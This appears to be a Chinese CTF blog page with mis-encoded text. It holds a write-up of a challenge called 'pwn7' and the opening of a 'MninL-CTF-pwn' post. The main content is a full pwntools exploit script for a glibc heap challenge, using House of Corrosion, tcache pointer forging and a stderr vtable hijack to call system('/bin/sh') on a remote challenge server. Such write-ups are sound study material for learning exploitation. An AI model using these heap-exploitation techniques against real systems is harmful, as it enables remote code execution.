<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œä¹Ÿæ˜¯çœ‹çš„æœ€ä¹…çš„ä¸€é“é¢˜ï¼Œå¯ä»¥é€šè¿‡mmapä¼ªé€ å †å—freeæ”¾åˆ°binä¸Šï¼Œç”±äºä½¿ç”¨çš„æ˜¯calloc,æ‰€ä»¥æ— æ³•ç®€å•çš„ä½¿ç”¨tcacheå®Œæˆæ”»å‡»ï¼Œèƒ½ä½¿ç”¨çš„åªæœ‰largebinattackæ²¡æ³•æ•´ï¼Œåæ¥ç»è¿‡æç¤ºå‘ç°å¯ä»¥ä½¿ç”¨House of Corrosionå®Œæˆä¸€å®šèŒƒå›´çš„ä»»æ„å†™ï¼Œè¿™å°±å¥½åŠå¤šäº†ï¼Œæ§åˆ¶stderrçš„vtableæŒ‡å‘_IO_helper_jumps,ç„¶åä¿®æ”¹ _IO_helper_jumpsåç§»ä¸º0x60çš„å‡½æ•°æŒ‡é’ˆä¸ºsystemï¼Œç„¶åæŠŠstderrçš„å‰å…«ä¸ªå­—èŠ‚æ”¹æˆå­—ç¬¦ä¸²<code>/bin/sh</code>,ç„¶åæ§åˆ¶topchunkåˆ°mmapçš„ç©ºé—´ï¼Œä¿®æ”¹sizeç”³è¯·å †å—è§¦å‘__malloc_assertå‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned <span class="built_in">int</span> line,</span><br><span class="line">       const char *function)</span><br><span class="line">&#123;</span><br><span class="line">(void) __fxprintf (NULL, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (stderr);</span><br><span class="line">abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨fflushä¸­å°±ä¼šè°ƒç”¨stderrä¸­vtableçš„åç§»ä¸º0x60å‡½æ•°æŒ‡é’ˆï¼Œæ­¤æ—¶rdiæŒ‡å‘stderrç»“æ„ä½“ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ï¼Œåç§»ä¸º0x60å‡½æ•°æŒ‡é’ˆä¹Ÿæ˜¯system,æ­¤æ—¶å°±getshelläº†ã€‚</p>
<p>è„šæœ¬æ¯”è¾ƒä¹±ï¼Œå…¶ä¸­å¥½å¤šæ²¡ç”¨ï¼Œæ‰€ä»¥çœ‹èµ·æ¥è¿™ä¹ˆå¤š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26218</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">offset,size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;offset: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;5. exit\n&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x430</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x431</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">132</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    <span class="comment"># pay+=p64(0)+p64(0x2b61)</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x420</span>)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    show()</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x61</span>-<span class="number">0x1e0c00</span></span><br><span class="line">    stderr_addr=<span class="number">0x1e15e0</span>+libc_addr</span><br><span class="line">    stderr_chain=stderr_addr+<span class="number">0x68</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">130</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x830</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">    mem_addr=u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x820</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">8</span>,p64(libc_addr+<span class="number">0x1e0c00</span>))</span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e1000</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1ed5b0</span>-<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x830</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(mem_addr+<span class="number">0x820</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x820</span>)*<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0x830</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x20</span>)*<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    fake_io_1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_1+=p64(mem_addr+<span class="number">0x1a00</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_1+=p64(mem_addr+<span class="number">0x1e00</span>)+p64(mem_addr+<span class="number">0x1e00</span>+<span class="number">22</span>)</span><br><span class="line">    fake_io_1+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(mem_addr+<span class="number">0x920</span>)</span><br><span class="line">    fake_io_1+=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x1e2560</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x820</span>,<span class="built_in">len</span>(fake_io_1),fake_io_1)</span><br><span class="line"></span><br><span class="line">    fake_io_2=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(mem_addr+<span class="number">0x1a00</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(mem_addr+<span class="number">0x1e00</span>)+p64(mem_addr+<span class="number">0x1e00</span>+<span class="number">22</span>)</span><br><span class="line">    fake_io_2+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)</span><br><span class="line">    fake_io_2+=p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x1e2560</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x920</span>,<span class="built_in">len</span>(fake_io_2),fake_io_2)</span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">18</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    free_hook=libc_addr+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    <span class="built_in">next</span>=((mem_addr+<span class="number">0x1030</span>&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(free_hook-<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x8</span>,p64(<span class="built_in">next</span>))</span><br><span class="line">    pay=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    edit(<span class="number">0x1e00</span>,<span class="number">0x18</span>,pay)</span><br><span class="line">    free(<span class="number">0x460</span>)</span><br><span class="line">    add(<span class="number">0x420</span>)</span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">1</span>)+<span class="string">&#x27;A&#x27;</span></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    show()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;aA&quot;</span>)</span><br><span class="line">    heap_aadr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">130</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1200</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1230</span>)</span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(libc_addr+<span class="number">0x1e0ff0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_addr+<span class="number">0x1e3e78</span>-<span class="number">0x20</span>-<span class="number">3</span>))</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1631</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x651</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line"></span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(<span class="number">0x1e1960</span>+libc_addr)</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1620</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1c41</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xc61</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line"></span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^(libc_addr+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1c30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x1481</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x4a1</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1fff</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    free(<span class="number">0x1030</span>)</span><br><span class="line">    pay=(((mem_addr+<span class="number">0x1030</span>)&gt;&gt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)^<span class="number">0x0068732f6e69622f</span></span><br><span class="line">    edit(<span class="number">0x1030</span>,<span class="number">0x10</span>,p64(pay)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x1470</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(mem_addr+<span class="number">0x1220</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x1220</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x1220</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)+p64(libc_addr+<span class="number">0x1e0ff0</span>)+p64(mem_addr+<span class="number">0x20</span>)*<span class="number">3</span>)</span><br><span class="line">    pay=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">22</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">0x1800</span>,<span class="built_in">len</span>(pay),pay)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">0x1830</span>)</span><br><span class="line">        edit(<span class="number">0x1830</span>,<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0x1830</span>)</span><br><span class="line">    edit(<span class="number">0x1820</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xce</span>))</span><br><span class="line">    add(<span class="number">0xffff</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/MninL-CTF-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/11/MninL-CTF-pwn/" class="post-title-link" itemprop="url">MninL-CTF-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-11 19:19:42 / ä¿®æ”¹æ—¶é—´ï¼š19:20:13" itemprop="dateCreated datePublished" datetime="2022-05-11T19:19:42+08:00">2022-05-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>![img](file:///C:\Users\å¼ é¹\Documents\Tencent Files\2220323423\Image\C2C(}RLTKRW2)0W46[NJBY[R`A.png)</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220511133825521.png" alt="image-20220511133825521"></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>ä¸€é“æœ‰ç‚¹ç‚¹éº»çƒ¦çš„scanfæ ˆæº¢å‡ºï¼Œç»™äº†ä¸¤æ¬¡ä»»æ„æ”¹å’Œä¸€æ¬¡74å­—èŠ‚çš„scanfè¾“å…¥æœºä¼šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„æ”¹æ”¹TLSå‚¨å­˜çš„canaryçš„å€¼ï¼Œä¸è¿‡åªæœ‰åœ¨çº¿ç¨‹ä¸­æ‰canaryçš„å‚¨å­˜ä½ç½®æ‰ç¦»æ ˆå¾ˆè¿‘ï¼Œå¯ä»¥é€šè¿‡æ ˆæ”¹ï¼Œåœ¨è¿›ç¨‹ä¸­éƒ½æ˜¯å‚¨å­˜åœ¨fsæ®µï¼Œç¦»æ ˆéå¸¸è¿œå°±ä¸å¥½æ›´æ”¹äº†ï¼Œç„¶åé€šè¿‡scanfçš„æ ˆæº¢å‡ºæä¸ªoggå°±èƒ½getshelläº†ã€‚</p>
